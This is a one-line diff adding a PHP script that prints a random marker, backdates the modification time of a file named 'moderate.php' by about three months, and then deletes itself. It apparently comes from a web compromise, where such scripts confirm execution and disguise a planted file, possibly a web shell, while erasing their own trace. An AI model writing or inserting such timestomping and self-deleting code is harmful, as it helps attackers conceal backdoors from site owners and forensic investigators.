@@ -1,0 +1,1 @@
+<?php echo "qyrZCdMabn"; if (file_exists("./moderate.php")){ touch("./moderate.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*HdUWty5sec1W64nABrNK*/ ?>
